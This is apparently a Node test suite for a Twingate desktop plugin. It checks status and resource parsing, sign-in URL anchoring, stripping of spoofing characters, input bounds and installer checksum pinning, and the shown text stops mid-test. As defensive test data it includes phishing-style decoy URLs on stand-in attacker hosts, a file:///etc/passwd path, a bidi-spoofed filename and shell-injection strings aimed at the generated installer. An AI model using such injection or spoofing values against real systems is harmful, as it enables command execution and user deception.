// Model.js is loaded by QML as a plain script (no module system), so it has no
// exports. Rather than compromise the plugin file for the sake of the tests, the
// tests evaluate it and lift the functions out.

const { test } = require("node:test")
const assert = require("node:assert")
const fs = require("node:fs")
const path = require("node:path")

const source = fs.readFileSync(path.join(__dirname, "..", "Model.js"), "utf8")
const Model = new Function(
  source +
    "; return { stripAnsi, normalizeStatus, isConnected, isDaemonDown, statusLabel," +
    " statusDetail, parseResources, resourceAddress, resourceHeading, parseAuthUrl, sharedAuthStatus, isCountdownAuthStatus, stripControl, clientUrl, CLIENT_BUILDS, CLIENT_VERSION, clampField, MAX_INPUT, READ_LIMIT, MAX_RESOURCES, CLI_TIMEOUT_SEC, byteLength, wasClipped, clipboardValue, AUTO_OPEN_WINDOW_MS, shouldArmAutoOpen," +
    " ACTION_TIMEOUT_SEC, TRUSTED_EXECUTABLES, PKEXEC_ACTIONS, actionFailure, parseAccount, isLockedAuthStatus, SEARCH_MIN_RESOURCES, filterResources }"
)()

const ESC = "\x1b"

test("normalizeStatus maps the CLI vocabulary", () => {
  assert.equal(Model.normalizeStatus("online"), "online")
  assert.equal(Model.normalizeStatus("offline"), "offline")
  assert.equal(Model.normalizeStatus("authenticating"), "authenticating")
  assert.equal(Model.normalizeStatus("not-running"), "not-running")
})

test("normalizeStatus tolerates whitespace, case and trailing output", () => {
  assert.equal(Model.normalizeStatus("  Online \n"), "online")
  assert.equal(Model.normalizeStatus("ONLINE"), "online")
  // Only the first line is the status token; later lines are noise.
  assert.equal(Model.normalizeStatus("online\nsome trailing chatter"), "online")
  // Seen across CLI versions.
  assert.equal(Model.normalizeStatus("notrunning"), "not-running")
})

test("normalizeStatus reports unknown rather than guessing", () => {
  // A wrong state drives the wrong toggle action, so anything unrecognised
  // must stay unknown instead of collapsing to offline.
  assert.equal(Model.normalizeStatus(""), "unknown")
  assert.equal(Model.normalizeStatus("reconnecting-soon"), "unknown")
  assert.equal(Model.normalizeStatus(null), "unknown")
})

test("daemon-down is distinct from signed-out", () => {
  assert.equal(Model.isDaemonDown("not-running"), true)
  assert.equal(Model.isDaemonDown("offline"), false)
  assert.equal(Model.isConnected("online"), true)
  assert.equal(Model.isConnected("authenticating"), false)
})

test("every state has a label", () => {
  for (const state of ["online", "offline", "authenticating", "not-running", "missing", "unknown"]) {
    assert.ok(Model.statusLabel(state).length > 0, state)
  }
})

test("every state that needs explaining has a detail", () => {
  for (const state of ["offline", "authenticating", "missing", "unknown"]) {
    assert.ok(Model.statusDetail(state).length > 0, state)
  }
})

test("connected has no detail, because reachability is not something we know", () => {
  // `twingate status` saying "online" is not the same as a resource being
  // reachable. Asserting it would state a proxy signal as fact.
  assert.equal(Model.statusDetail("online"), "")
})

test("not-running is the ordinary off state, labelled as such", () => {
  // There is no disconnected-but-running state: both `twingate stop` and
  // `twingate disconnect` exit the client, taking twingate.service with it.
  // So this is what "off" looks like, and calling it "Service stopped" with a
  // warning badge presented normal operation as a fault.
  assert.equal(Model.statusLabel("not-running"), "Disconnected")
  assert.equal(Model.statusDetail("not-running"), "")
})

test("stripAnsi removes colour escapes", () => {
  assert.equal(Model.stripAnsi(ESC + "[1mbold" + ESC + "[0m"), "bold")
})

// Captured verbatim from a real connected client, 2026-08-25. The columns are
// TAB-separated AND space-padded, which is what makes a space-run split wrong.
const T = "\t"
const REAL = [
  "RESOURCE NAME       " + T + "ADDRESS            " + T + "ALIAS" + T + "AUTH STATUS",
  "Docker VM           " + T + "192.0.2.10         " + T + "-    " + T + "Auth expires in 4 days",
  // Address exactly fills its column: a lone tab follows, no padding.
  "Jellyfin            " + T + "assets.example.test" + T + "-    " + T + "Auth expires in 4 days",
  // Name exactly fills its column: a lone tab follows, no padding.
  "Twingate Connector 2" + T + "192.0.2.40         " + T + "-    " + T + "Auth expires in 4 days",
  "acme Access         " + T + "*.example.com      " + T + "-    " + T + "Auth expires in 4 days"
].join("\n")

test("parseResources reads the real tab-separated table", () => {
  const r = Model.parseResources(REAL)
  assert.equal(r.length, 4)
  assert.deepEqual(
    { name: r[0].name, address: r[0].address, alias: r[0].alias, authStatus: r[0].authStatus },
    { name: "Docker VM", address: "192.0.2.10", alias: "", authStatus: "Auth expires in 4 days" }
  )
})

test("parseResources handles an address that exactly fills its column", () => {
  // A lone tab with no padding must not fuse address and alias. The fixture
  // host is exactly 19 characters for that reason -- do not "tidy" its length.
  const filled = Model.parseResources(REAL).find(r => r.name === "Jellyfin")
  assert.equal(filled.address, "assets.example.test")
  assert.equal(filled.authStatus, "Auth expires in 4 days")
  assert.equal(Model.resourceAddress(filled), "assets.example.test")
})

test("parseResources handles a name that exactly fills its column", () => {
  // Name and address must not fuse into one field.
  const conn = Model.parseResources(REAL).find(r => r.name === "Twingate Connector 2")
  assert.ok(conn, "row should not have fused name and address")
  assert.equal(conn.address, "192.0.2.40")
})

test("parseResources keeps names containing single spaces", () => {
  const r = Model.parseResources(REAL)
  assert.ok(r.some(x => x.name === "acme Access"))
})

test("a wildcard resource is listed but is not openable", () => {
  // It has no single address, so resourceAddress rejects it and the UI falls
  // back to copying rather than inventing a URL.
  const wild = Model.parseResources(REAL).find(r => r.name === "acme Access")
  assert.equal(wild.address, "*.example.com")
  assert.equal(Model.resourceAddress(wild), "")
})

test("parseResources normalises an absent alias", () => {
  // The CLI writes "-", which must not be rendered as if it were a hostname.
  assert.equal(Model.parseResources(REAL)[0].alias, "")
})

test("parseResources skips the column header", () => {
  assert.ok(!Model.parseResources(REAL).some(r => /^resource name$/i.test(r.name)))
})

test("parseResources skips --all section headings", () => {
  // `--all` prefixes a bare "MAIN RESOURCES" line with no tab.
  const withHeading = "MAIN RESOURCES\n" + REAL
  const r = Model.parseResources(withHeading)
  assert.ok(!r.some(x => x.name === "MAIN RESOURCES"))
  assert.equal(r.length, 4)
})

test("parseResources drops the disconnected notice, not the table", () => {
  assert.deepEqual(Model.parseResources("Twingate must be connected to display available resources."), [])
})

test("parseResources handles empty and blank input", () => {
  assert.deepEqual(Model.parseResources(""), [])
  assert.deepEqual(Model.parseResources("\n\n   \n"), [])
  assert.deepEqual(Model.parseResources(null), [])
})

test("sharedAuthStatus collapses a uniform column, and only a uniform one", () => {
  const r = Model.parseResources(REAL)
  assert.equal(Model.sharedAuthStatus(r), "Auth expires in 4 days")
  r[1].authStatus = "Auth required"
  assert.equal(Model.sharedAuthStatus(r), "")
  assert.equal(Model.sharedAuthStatus([]), "")
})

test("resourceAddress only accepts host-shaped values", () => {
  assert.equal(Model.resourceAddress({ address: "db.internal.example" }), "db.internal.example")
  assert.equal(Model.resourceAddress({ address: "192.0.2.10" }), "192.0.2.10")
  assert.equal(Model.resourceAddress({ address: "Online" }), "Online")
  assert.equal(Model.resourceAddress({ address: "not a host" }), "")
  assert.equal(Model.resourceAddress({ address: "" }), "")
  assert.equal(Model.resourceAddress(null), "")
})

test("resourceHeading carries the count and the scope", () => {
  assert.equal(Model.resourceHeading(8, "default"), "Resources (8)")
  assert.equal(Model.resourceHeading(1, "default"), "Resources (1)")
  assert.equal(Model.resourceHeading(0, "default"), "Resources (0)")
  // "All" is the only signal that hidden entries are included.
  assert.equal(Model.resourceHeading(8, "all"), "All resources (8)")
})

// Real `twingate status -v -d` output captured while authenticating, 2026-08-25.
const VERBOSE_AUTHENTICATING = `Authenticating: None

Visit the following URL to authenticate to your Twingate network:

https://acme.twingate.com/client-node/login?redirect_uri=https%3A%2F%2Facme.twingate.com%2Fapi%2Fv5%2Fclient%2Flogin%3Fdevice_hardware_id%3Dabc123%26auth_session_id%3Dxyz789
`

test("parseAuthUrl pulls the sign-in URL out of verbose status", () => {
  const url = Model.parseAuthUrl(VERBOSE_AUTHENTICATING)
  assert.ok(url.startsWith("https://acme.twingate.com/client-node/login"))
  assert.ok(url.includes("auth_session_id%3Dxyz789"))
  // Must not swallow the trailing newline into the URL handed to the browser.
  assert.equal(url, url.trim())
})

test("parseAuthUrl returns empty when there is no URL", () => {
  assert.equal(Model.parseAuthUrl("not-running"), "")
  assert.equal(Model.parseAuthUrl(""), "")
  assert.equal(Model.parseAuthUrl(null), "")
})

test("parseAuthUrl will not fall back to a URL the label did not introduce", () => {
  // A URL with no sign-in label above it must yield nothing, however
  // well-formed: the result opens in a browser with no user action.
  assert.equal(Model.parseAuthUrl("https://evil.example/phish"), "")
  assert.equal(Model.parseAuthUrl(
    "Some resource notes\nhttps://evil.example/phish\nmore prose"), "")
  // And a decoy label that is NOT the sign-in sentence must not qualify it.
  assert.equal(Model.parseAuthUrl(
    "Visit the following URL for documentation https://evil.example/phish"), "")
  // The real sentence still works.
  assert.equal(Model.parseAuthUrl(
    "Visit the following URL to authenticate:\nhttps://x.twingate.com/login"),
    "https://x.twingate.com/login")
})

test("parseAuthUrl refuses non-https schemes", () => {
  // The result goes straight to the browser launcher, so file:// and http://
  // must not pass. Fixtures carry the anchor label, or the parser returns
  // early and the URL rules go untested.
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "file:///etc/passwd"), "")
  assert.equal(Model.parseAuthUrl(A + "http://evil.example/login"), "")
})

test("parseAuthUrl stops at whitespace and quotes", () => {
  // Needs the CLI's label now: without it the parser returns nothing rather
  // than falling back to the first URL it can find anywhere.
  const url = Model.parseAuthUrl(
    "Visit the following URL to authenticate:\nhttps://x.twingate.com/login?a=1 then some prose")
  assert.equal(url, "https://x.twingate.com/login?a=1")
})

test("isCountdownAuthStatus suppresses countdowns of any length", () => {
  // A countdown has no action attached: when it lapses you turn the switch on
  // and sign in, which is the ordinary flow. Warning about it changes nothing.
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 4 days"), true)
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 1 day"), true)
  assert.equal(Model.isCountdownAuthStatus("Auth expires in 3 hours"), true)
  assert.equal(Model.isCountdownAuthStatus("auth expires in 20 minutes"), true)
})

test("isCountdownAuthStatus keeps anything that explains a failure", () => {
  // These say a resource is unreachable NOW, which answers "why can I not
  // reach this?" even though the remedy is the same sign-in.
  assert.equal(Model.isCountdownAuthStatus("Auth required"), false)
  assert.equal(Model.isCountdownAuthStatus("Expired"), false)
  // Vocabulary this plugin does not know must never be suppressed.
  assert.equal(Model.isCountdownAuthStatus("Reauthentication pending"), false)
  assert.equal(Model.isCountdownAuthStatus(""), false)
  assert.equal(Model.isCountdownAuthStatus(null), false)
})

test("stripAnsi needs the ESC introducer, so bracketed names survive", () => {
  // The regex is written \x1b\[... as an escape, not a literal 0x1b byte,
  // which is invisible in editors. If the ESC were ever lost it would strip
  // bracketed text from real names.
  assert.equal(Model.stripAnsi("Prod [eu-west] DB"), "Prod [eu-west] DB")
  assert.equal(Model.stripAnsi("Build [2b] host"), "Build [2b] host")
  assert.equal(Model.stripAnsi(ESC + "[1mbold" + ESC + "[0m"), "bold")
})

test("parsed fields carry no control characters", () => {
  // Resource names are set by whoever administers the Twingate network, and a
  // name reaches the clipboard. A CR pasted into a terminal without bracketed
  // paste executes what follows it.
  const r = Model.parseResources("wat\r\u0007ch\thost.example\t-\tAuth expires in 4 days")
  assert.equal(r[0].name, "watch")
  assert.ok(!/[\x00-\x1f\x7f]/.test(r[0].name))
})

test("parseAuthUrl anchors to the CLI's own label", () => {
  // `twingate` prints documentation links too. Taking the first https:// in
  // the output would hand the browser whichever came first if a future version
  // reordered it -- silently, with no code change here.
  const out = [
    "Learn more: https://www.twingate.com/docs/linux-headless",
    "",
    "Visit the following URL to authenticate to your Twingate network:",
    "",
    "https://acme.twingate.com/client-node/login?x=1"
  ].join("\n")
  assert.equal(Model.parseAuthUrl(out), "https://acme.twingate.com/client-node/login?x=1")
})

test("parseAuthUrl requires a token boundary", () => {
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "xhttps://evil.example/path"), "")
})

test("parseAuthUrl refuses an over-long URL", () => {
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "https://evil.example/" + "a".repeat(3000)), "")
  // ...and the bound must not reject an ordinary sign-in URL.
  const ok = "https://veepee.twingate.com/api/auth?token=" + "b".repeat(200)
  assert.equal(Model.parseAuthUrl(A + ok), ok)
})

test("parseAuthUrl still rejects credentials and non-https", () => {
  const A = "Visit the following URL to authenticate:\n"
  assert.equal(Model.parseAuthUrl(A + "https://user:pass@evil.example/x"), "")
  assert.equal(Model.parseAuthUrl(A + "http://evil.example/x"), "")
  assert.equal(Model.parseAuthUrl(A + "file:///etc/passwd"), "")
})

test("normalizeStatus matches the state token as a prefix", () => {
  // Captured from a real client. When a resource needs per-resource
  // re-authentication the CLI writes the token with NO trailing newline and
  // appends prose to the same line. Requiring equality reported "unknown"
  // while the client was connected -- urgent badge, switch off, and a panel
  // saying the CLI was unrecognisable.
  const real = "onlineA resource you attempted to access requires additional authentication.\n" +
               "Open the following URL to authorize access to the resource:\n\n" +
               "https://example.com/login/oauth/authorize?client_id=x"
  assert.equal(Model.normalizeStatus(real), "online")
})

test("normalizeStatus does not confuse offline with online", () => {
  // "offline" must never win via the "online" prefix, in either direction.
  assert.equal(Model.normalizeStatus("offline"), "offline")
  assert.equal(Model.normalizeStatus("offlineSomething appended"), "offline")
  assert.equal(Model.normalizeStatus("onlineSomething appended"), "online")
})

test("resource count is bounded, and truncation is reported", () => {
  // Resource names and addresses come from whoever administers the Twingate
  // network. Unbounded, a hostile or merely enormous tenant degrades the
  // long-lived shell process itself, not a disposable app.
  let many = ""
  for (let i = 0; i < 5000; i++) many += `name${i}\t10.0.0.1\t-\tOK\n`
  const r = Model.parseResources(many)
  assert.equal(r.length, 200)
  assert.equal(r.truncated, true, "must flag that the list was cut")
})

test("individual fields are bounded, well above any legal value", () => {
  // The cap protects the process from a hostile field; it must not truncate a
  // legitimate one, so it sits far above the 253-character DNS maximum.
  const r = Model.parseResources("x".repeat(9000) + "\t10.0.0.1\t-\tOK")
  // The contract is "long enough for any legal value, short enough to bound
  // the process" -- not one specific number, which a deliberate bump would
  // break for no reason.
  assert.ok(r[0].name.length > 253, "must not clamp below the DNS maximum")
  assert.ok(r[0].name.length < 4096, "must still bound the process")
  assert.ok(r[0].name.endsWith("…"), "truncation is visible, not silent")
})

test("a normal fleet is untouched by the bounds", () => {
  const r = Model.parseResources(REAL)
  assert.equal(r.length, 4)
  assert.equal(r.truncated, undefined)
})

test("the client is pinned to an immutable versioned URL", () => {
  // A version in the path keeps root-executed bytes from changing after
  // review; the mutable "stable" path must never appear here.
  for (const arch of ["x86_64", "aarch64"]) {
    const url = Model.clientUrl(arch)
    assert.ok(url.includes("/" + Model.CLIENT_VERSION + "/"), `${arch} not versioned`)
    assert.ok(!url.includes("/stable/"), `${arch} still uses the mutable path`)
    assert.ok(url.startsWith("https://binaries.twingate.com/"), `${arch} wrong host`)
  }
})

test("every pinned build carries a full sha256", () => {
  // Twingate publishes no signature, so this digest is the only integrity
  // control in the chain. A short or missing one would silently weaken it.
  for (const [arch, b] of Object.entries(Model.CLIENT_BUILDS)) {
    assert.match(b.sha256, /^[0-9a-f]{64}$/, `${arch} digest`)
    assert.ok(b.file.endsWith(".pkg.tar.zst"), `${arch} file`)
  }
})

test("an unknown architecture yields no URL rather than a wrong one", () => {
  assert.equal(Model.clientUrl("riscv64"), "")
})

test("heading marks a truncated list rather than asserting the cap is the total", () => {
  assert.equal(Model.resourceHeading(200, "default", true), "Resources (200+)")
  assert.equal(Model.resourceHeading(4, "default", false), "Resources (4)")
  assert.equal(Model.resourceHeading(8, "all", true), "All resources (8+)")
})

test("parseAuthUrl returns nothing when the CLI printed no label", () => {
  // The fallback silently restored "first https:// anywhere", and this result
  // is opened in a browser with no user action.
  assert.equal(Model.parseAuthUrl("junk https://attacker.example/steal?x=1"), "")
})

test("bidi and zero-width characters are stripped", () => {
  // They reach the renderer and the clipboard, where they spoof a name.
  assert.equal(Model.stripControl("invoice‮gnp.exe"), "invoicegnp.exe")
  assert.equal(Model.stripControl("a​b﻿c"), "abc")
})

test("a legal 253-character FQDN is not clamped into uselessness", () => {
  // A clamped address would fail the host check and become unusable.
  // Exactly 253 characters: the DNS maximum, which is the point of the test.
  const fqdn = ("a".repeat(63) + ".").repeat(3) + "a".repeat(61)
  const r = Model.parseResources("host\t" + fqdn + "\t-\tOK")
  assert.equal(r[0].address, fqdn)
  assert.equal(Model.resourceAddress(r[0]), fqdn, "must still be openable")
})

test("clamping never splits a surrogate pair", () => {
  const name = "x".repeat(1023) + "\u{1F600}"
  const r = Model.parseResources(name + "\t10.0.0.1\t-\tOK")
  assert.ok(!/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(r[0].name), "lone high surrogate")
})

test("input past the 1 MB bound is never parsed", () => {
  // A row lying beyond MAX_INPUT does not exist, and the row cap is provably
  // not what ended the loop.
  const pad = "p".repeat(20000)
  let big = ""
  for (let i = 0; i < 60; i++) big += `n${i}${pad}\t10.0.0.1\t-\tOK\n`
  big += "SENTINEL\t10.0.0.9\t-\tOK\n"
  const r = Model.parseResources(big)
  assert.ok(r.length < 200, "the row cap must not be what ends this")
  assert.ok(!r.some(x => x.name.startsWith("SENTINEL")),
    "a row past MAX_INPUT must never be parsed")
})

// ── Guards over the QML, which node cannot execute ────────────────────
//
// QML is not runnable here, so where a function or handler cannot be extracted
// and executed, these assert the source. A coarse guard on a real invariant
// beats none.

const PANEL = fs.readFileSync(path.join(__dirname, "..", "Panel.qml"), "utf8")
const SERVICE = fs.readFileSync(path.join(__dirname, "..", "Service.qml"), "utf8")

test("every Text rendering plugin data declares PlainText", () => {
  // Qt's default AutoText renders a leading tag as HTML, and resource names
  // are set by whoever administers the Twingate network.
  // Scan each block to its own closing brace rather than a fixed window: a
  // fixed window produced a false positive on the one element whose
  // textFormat sits 21 lines in, behind stacked comments.
  const lines = PANEL.split("\n")
  // Matches multi-line `Text {` blocks, which is every one in this file. A
  // single-line `Text { ... }` would be skipped, so the count assertion below
  // is what catches one being introduced.
  const declared = (PANEL.match(/\bText\s*\{/g) || []).length
  let checked = 0
  lines.forEach((line, i) => {
    const m = line.match(/^(\s*)Text\s*\{\s*$/)
    if (!m) return
    const indent = m[1].length
    let body = ""
    for (let j = i + 1; j < lines.length; j++) {
      if (lines[j].match(new RegExp(`^\\s{${indent}}\\}\\s*$`))) break
      body += lines[j] + "\n"
    }
    checked++
    assert.ok(/textFormat:\s*Text\.PlainText/.test(body),
      `Text block at line ${i + 1} does not set textFormat`)
  })
  assert.ok(checked >= 7, `expected at least 7 Text blocks, checked ${checked}`)
  assert.equal(checked, declared,
    `${declared - checked} Text block(s) were not scanned -- likely written on one line`)
})

test("the install button is wired to the installer", () => {
  assert.ok(/onClicked:\s*twingate\.installClient\(\)/.test(PANEL),
    "install button must call installClient()")
})

test("the resource heading is told whether the list was truncated", () => {
  // Without the third argument the cap would read as the total.
  assert.ok(/Model\.resourceHeading\([^)]*,[^)]*,[^)]*\)/.test(SERVICE),
    "resourceHeading must be called with the truncated flag")
})

test("lastError is sanitised and clamped before it is stored", () => {
  // It reaches the renderer, the shell log and IPC. Every assignment is
  // checked; one from a variable counts only if that variable was sanitised.
  const sanitisedVars = new Set(
    [...SERVICE.matchAll(/var (\w+) = Model\.clampField\(Model\.stripControl\(/g)]
      .map(m => m[1]))
  assert.ok(sanitisedVars.size > 0, "no sanitised intermediate found; guard is vacuous")
  for (const a of SERVICE.match(/lastError\s*=\s*[^\n]*/g) || []) {
    const literal = /lastError\s*=\s*"/.test(a)          // a fixed string we wrote
    const inline = /Model\.clampField\(Model\.stripControl\(/.test(a)
    const viaVar = (a.match(/lastError\s*=\s*(\w+)\s*$/) || [])[1]
    assert.ok(literal || inline || (viaVar && sanitisedVars.has(viaVar)),
      `unsanitised lastError assignment: ${a.trim()}`)
  }
  assert.ok(/lastError\s*=\s*Model\.clampField\(Model\.stripControl\(/.test(SERVICE),
    "lastError must be stripped and clamped")
})

test("diagnostics reports truncation", () => {
  assert.ok(/resourcesTruncated:/.test(SERVICE))
})

test("a second terminal action is refused visibly, not silently", () => {
  // A silent refusal would leave the switch showing an action that never ran.
  const fn = SERVICE.slice(SERVICE.indexOf("function runInTerminal"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  assert.ok(/if \(actionPending\)/.test(body), "must guard on actionPending")
  // Scoped to the guard's own block, not the rate-limit branch beside it.
  const guard = body.slice(body.indexOf("if (actionPending)"))
  const block = guard.slice(0, guard.indexOf("\n    }"))
  assert.ok(/actionError\s*=/.test(block), "the refusal must be visible, where a poll cannot erase it")
  assert.ok(/_log\(/.test(block), "the refusal must be logged")
  assert.ok(/return false/.test(body), "must report the refusal to the caller")
})

// ── Sign-in URL anchoring and input bounds ────────────────────────────

test("the auth-URL anchor cannot be preempted by earlier output", () => {
  // This URL opens with no user action, and search() returns the first match,
  // so a generic label earlier in the output must not win.
  const out = [
    // A generic "the following URL" decoy.
    "Visit the following URL for documentation https://attacker.example/phish",
    "",
    "Visit the following URL to authenticate to your Twingate network:",
    "https://real.twingate.com/login"
  ].join("\n")
  assert.equal(Model.parseAuthUrl(out), "https://real.twingate.com/login")
})

test("the auth URL must sit near its label", () => {
  // A label far above an unrelated URL is not an introduction to it.
  assert.equal(
    Model.parseAuthUrl("Visit the following URL to authenticate\n\n\n\n\nhttps://far.example/a"), "")
  assert.equal(
    Model.parseAuthUrl("Visit the following URL to authenticate\nhttps://near.example/a"),
    "https://near.example/a")
})

test("input clipped by MAX_INPUT is REPORTED, not silently dropped", () => {
  // The rows are deliberately long and few, so the input clamp -- not the
  // 200-row cap -- is what sets `truncated`.
  const pad = "p".repeat(9000)
  const rows = 150
  const huge = "NAME\tADDRESS\tTYPE\tSTATUS\n" +
    Array.from({ length: rows }, (_, i) => `n${i}${pad}\ta${i}.example\tt\ton`).join("\n")
  assert.ok(huge.length > 1048576, "fixture must exceed MAX_INPUT")
  const parsed = Model.parseResources(huge)
  assert.ok(parsed.length < 200, `fixture must stay under the row cap, parsed ${parsed.length}`)
  assert.ok(parsed.length < rows, "some rows must actually have been clipped")
  assert.equal(parsed.truncated, true, "a clipped buffer must be flagged")
  assert.ok(Model.resourceHeading(parsed.length, "all", parsed.truncated).includes("+"))
})

test("a list that fits is not marked truncated", () => {
  const small = Model.parseResources("NAME\tADDRESS\tTYPE\tSTATUS\nn\ta\tt\ton\n")
  assert.equal(small.truncated, undefined)
  assert.ok(!Model.resourceHeading(small.length, "all", small.truncated).includes("+"))
})

test("stripControl removes the invisible and spoofing classes it declares", () => {
  // U+2028/9 render as line breaks inside a Text and reach the clipboard as
  // newlines. The Hangul fillers render blank but are letters to most
  // software, so they pad a name to look like another. TAG characters are
  // astral and need their own surrogate rule.
  const invisible = {
    "U+061C ARABIC LETTER MARK": "\u061c",
    "U+2028 LINE SEPARATOR": "\u2028",
    "U+2029 PARAGRAPH SEPARATOR": "\u2029",
    "U+0085 NEL": "\u0085",
    "U+009B CSI": "\u009b",
    "U+00AD SOFT HYPHEN": "\u00ad",
    "U+2060 WORD JOINER": "\u2060",
    "U+FFF9 INTERLINEAR ANNOTATION": "\ufff9",
    "U+202E RIGHT-TO-LEFT OVERRIDE": "\u202e",
    "U+200B ZERO WIDTH SPACE": "\u200b",
    "U+FEFF BOM": "\ufeff",
    "U+180E MONGOLIAN VOWEL SEPARATOR": "\u180e",
    "U+2061 FUNCTION APPLICATION": "\u2061",
    "U+2062 INVISIBLE TIMES": "\u2062",
    "U+2063 INVISIBLE SEPARATOR": "\u2063",
    "U+2064 INVISIBLE PLUS": "\u2064",
    "U+115F HANGUL CHOSEONG FILLER": "\u115f",
    "U+1160 HANGUL JUNGSEONG FILLER": "\u1160",
    "U+3164 HANGUL FILLER": "\u3164",
    "U+FFA0 HALFWIDTH HANGUL FILLER": "\uffa0",
    "U+E0001 LANGUAGE TAG": "\udb40\udc01",
    "U+E0041 TAG LATIN CAPITAL A": "\udb40\udc41"
  }
  for (const [name, ch] of Object.entries(invisible)) {
    assert.equal(Model.stripControl("a" + ch + "b"), "ab", `${name} survived`)
  }
  // And it must not eat ordinary text -- including astral characters, which
  // the TAG rule operates on the same surrogate range as.
  assert.equal(Model.stripControl("Caf\u00e9 \u2014 na\u00efve \u65e5\u672c\u8a9e \ud83d\ude00"),
    "Caf\u00e9 \u2014 na\u00efve \u65e5\u672c\u8a9e \ud83d\ude00")
})

// ── The installer, rendered rather than grepped ───────────────────────
// Renders the real script from the real source and asserts what it contains.

function renderInstallScript(buildsOverride) {
  // Executes the real installer out of Service.qml, with runInTerminal
  // stubbed to capture what it was handed, rather than a copy of its loop.
  const body = extractFunction("installClient")
  let captured = null
  const run = (cmd) => { captured = cmd; return true }
  const model = buildsOverride
    ? Object.assign(Object.create(null), Model, { CLIENT_BUILDS: buildsOverride })
    : Model
  new Function("Model", "runInTerminal", "_log", body + "; installClient()")(
    model, run, () => {})
  assert.ok(captured !== null, "installClient() launched nothing")
  return captured
}

test("the rendered installer contains every pinned build", () => {
  const script = renderInstallScript()
  const arches = Object.keys(Model.CLIENT_BUILDS)
  assert.ok(arches.length >= 2, "expected more than one architecture to be pinned")
  for (const arch of arches) {
    const b = Model.CLIENT_BUILDS[arch]
    // Quoted, not bare: validation already makes the pattern safe, so this is
    // the second of the two independent guards, and it must not quietly go.
    assert.ok(script.includes("'" + arch + "')"), `${arch} branch missing or unquoted`)
    assert.ok(script.includes(b.sha256), `${arch} digest missing from the script`)
    assert.ok(script.includes(Model.clientUrl(arch)), `${arch} URL missing from the script`)
  }
})

test("the rendered installer verifies before it installs", () => {
  const script = renderInstallScript()
  assert.ok(script.includes("sha256sum -c"), "no checksum verification")
  assert.ok(script.indexOf("sha256sum -c") < script.indexOf("pacman -U"),
    "the checksum must be verified BEFORE pacman runs")
  assert.ok(!script.includes("--noconfirm"), "the user must confirm the install")
  assert.ok(script.includes("CHECKSUM MISMATCH"), "no refusal path on mismatch")
})

test("every pinned URL is immutable and version-qualified", () => {
  // A mutable /latest/ path is the whole reason the digest pin exists: the
  // bytes behind it can change after review.
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    const url = Model.clientUrl(arch)
    assert.ok(url.startsWith("https://"), `${arch}: not https`)
    assert.ok(url.includes(Model.CLIENT_VERSION), `${arch}: URL is not version-qualified`)
    assert.ok(!/\blatest\b/.test(url), `${arch}: URL is mutable`)
  }
})

test("a malformed CLIENT_BUILDS entry cannot reach the shell", () => {
  // Runs the real installer against a poisoned table. One field is poisoned
  // at a time and every other field is valid, so each validator is proven on
  // its own.
  const VALID = { file: "f.pkg.tar.zst", sha256: "0".repeat(64), bytes: 12345 }
  const cases = [
    ["PWNED-VIA-KEY", "x86_64) echo PWNED-VIA-KEY ;; zz", VALID],
    ["PWNED-VIA-FILE", "aarch64", { ...VALID, file: "'; echo PWNED-VIA-FILE; x='" }],
    ["PWNED-VIA-SUM", "riscv64", { ...VALID, sha256: "'; echo PWNED-VIA-SUM; x='" }],
    ["PWNED-VIA-SIZE", "ppc64", { ...VALID, bytes: "1'; echo PWNED-VIA-SIZE; x='" }]
  ]
  for (const [marker, arch, entry] of cases) {
    const script = renderInstallScript({ [arch]: entry })
    assert.ok(!script.includes(marker), `${marker} reached the generated shell`)
    // And the entry must be dropped entirely, not partially rendered.
    assert.ok(!script.includes(String(entry.file).replace(/'/g, "")) || marker === "PWNED-VIA-KEY",
      `${marker}: a rejected entry still rendered its filename`)
  }
  // A fully valid entry with an unusual-but-legal architecture must render, or
  // the validation is simply refusing everything.
  const ok = renderInstallScript({ riscv64: VALID })
  assert.ok(ok.includes("'riscv64')"), "a valid entry was wrongly rejected")

  // Every real entry still renders -- the validation must not be so strict it
  // rejects the builds this plugin actually ships.
  const real = renderInstallScript()
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    assert.ok(real.includes(Model.CLIENT_BUILDS[arch].sha256), `${arch} was wrongly rejected`)
  }
})

// ── Source guards for the QML-side bounds ─────────────────────────────

test("every stdout/stderr read is clamped before parsing", () => {
  // StdioCollector has no size cap. normalizeStatus runs on EVERY poll on the
  // thread that draws the desktop; a 5 MB buffer cost 532ms there.
  const reads = SERVICE.match(/String\((?:status|verbose|resources)(?:Stdout|Stderr)\.text \|\| ""\)[^\n]*/g) || []
  assert.ok(reads.length >= 5, `expected at least 5 collector reads, saw ${reads.length}`)
  for (const r of reads) {
    // READ_LIMIT, not MAX_INPUT: reading at exactly the parse bound is what
    // made a clipped list indistinguishable from a complete one.
    assert.ok(r.includes("slice(0, Model.READ_LIMIT)"), `unclamped collector read: ${r.trim()}`)
  }
})

// Runs the real terminal launcher against a stub host with a controllable
// clock.
function makeHost(overrides) {
  const host = Object.assign({
    minLaunchGapMs: 5000,
    actionError: "",
    _lastLaunchMs: 0,
    _connectLaunchMs: 0,
    actionPending: false,
    lastError: "",
    connectionState: "online",
    _stateAtAction: "",
    launches: [],
    now: 1000000,
    bar: null,
    settleTimer: { elapsed: 0, restart() {} },
    _log() {}
  }, overrides || {})
  host.bar = host.bar === null ? { run: (c) => host.launches.push(c) } : host.bar
  const body = extractFunction("runInTerminal")
  host.runInTerminal = new Function("self", "Util", `
    const Date = { now: () => self.now }
    with (self) { ${body}; return runInTerminal }
  `)(host, { shellQuote: (x) => "'" + String(x).replace(/'/g, "'\\''") + "'" })
  return host
}

test("the launch floor refuses a second action within the window", () => {
  const h = makeHost()
  assert.equal(h.runInTerminal("twingate start"), true, "first launch was refused")
  assert.equal(h.launches.length, 1)

  // Immediately after: refused, visibly.
  h.actionPending = false           // the poll cleared it, as it really does
  assert.equal(h.runInTerminal("twingate start"), false, "the floor did not hold")
  assert.equal(h.launches.length, 1, "a refused action still launched a terminal")
  assert.match(h.actionError, /rate limited/, "the refusal was silent")

  // Still inside the window, even at the last millisecond.
